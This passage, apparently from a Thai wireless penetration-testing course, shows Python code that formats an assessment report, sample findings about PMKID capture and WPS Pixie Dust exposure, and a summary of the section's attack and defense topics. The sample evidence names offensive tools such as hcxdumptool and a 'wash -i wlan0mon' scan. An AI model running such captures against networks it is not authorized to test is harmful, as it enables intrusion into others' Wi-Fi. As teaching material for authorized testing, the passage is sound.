**Date:** {datetime.now().strftime('%Y-%m-%d')}
**Assessor:** Security Team

## Executive Summary

The wireless security assessment identified **{len(findings['networks'])} Wi-Fi networks** 
and **{len(findings['vulnerabilities'])} security vulnerabilities**.

## Networks Discovered

| SSID | BSSID | Channel | Security | Signal |
|------|-------|---------|----------|--------|
"""
    
    for net in findings['networks']:
        report += f"| {net['ssid']} | {net['bssid']} | {net['channel']} | {net['security']} | {net['signal']} |\n"
    
    report += """

## Vulnerabilities Found

"""
    
    severity_order = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3, 'Info': 4}
    sorted_vulns = sorted(findings['vulnerabilities'], key=lambda x: severity_order.get(x['severity'], 99))
    
    for i, vuln in enumerate(sorted_vulns, 1):
        report += f"""
### [{vuln['severity']}] {i}. {vuln['title']}

**SSID/BSSID:** {vuln.get('target', 'N/A')}
**Description:** {vuln['description']}
**Evidence:** {vuln.get('evidence', 'See attached captures')}
**Remediation:** {vuln['remediation']}

"""
    
    report += """
## Recommendations

1. Upgrade all networks to WPA3
2. Disable WPS on all access points
3. Implement Wireless IDS/IPS
4. Enable 802.11w (Management Frame Protection)
5. Segment guest and corporate networks
6. Regularly audit Wi-Fi security
"""
    
    return report

# Sample findings
sample_findings = {
    'networks': [
        {'ssid': 'CorpWiFi', 'bssid': 'AA:BB:CC:DD:EE:FF', 'channel': 6, 'security': 'WPA2', 'signal': '-65dBm'},
        {'ssid': 'GuestNet', 'bssid': '11:22:33:44:55:66', 'channel': 11, 'security': 'WPA2', 'signal': '-70dBm'},
    ],
    'vulnerabilities': [
        {
            'title': 'WPA2 PMKID Capture Possible',
            'severity': 'High',
            'target': 'CorpWiFi (AA:BB:CC:DD:EE:FF)',
            'description': 'Successfully captured PMKID without requiring a connected client',
            'evidence': 'hcxdumptool captured PMKID in 30 seconds',
            'remediation': 'Upgrade to WPA3 or use complex passphrase (20+ characters)'
        },
        {
            'title': 'WPS Enabled',
            'severity': 'Medium',
            'target': 'GuestNet (11:22:33:44:55:66)',
            'description': 'WPS PIN method enabled, vulnerable to Pixie Dust attack',
            'evidence': 'wash -i wlan0mon detected WPS',
            'remediation': 'Disable WPS on all access points'
        },
    ]
}

report = generate_wireless_report(sample_findings)
print(report[:1000])
print("...")
```

---

## สรุปส่วนที่ 22

ในส่วนนี้เราได้เรียนรู้:

1. **Wi-Fi Protocol Analysis** - 802.11 frame types, Scapy analysis
2. **WPA3 Security** - SAE, Dragonblood, PMKID attack
3. **Bluetooth Security** - BLE scanning, GATT, Classic attacks
4. **Rogue AP Advanced** - KARMA attack, captive portal
5. **Zigbee/IoT** - MQTT testing, CoAP
6. **SDR Security** - RTL-SDR, signal scanning, OOK decoding
7. **5G Security** - Architecture, IMSI catcher detection
8. **Wireless IDS** - Deauth flood, Evil Twin detection
9. **Password Cracking** - Hashcat strategies, custom wordlists
10. **Wireless PT Report** - Professional report generation

> หมายเหตุ: เนื้อหาทั้งหมดนี้เพื่อการศึกษาและทดสอบในระบบที่ได้รับอนุญาตเท่านั้น
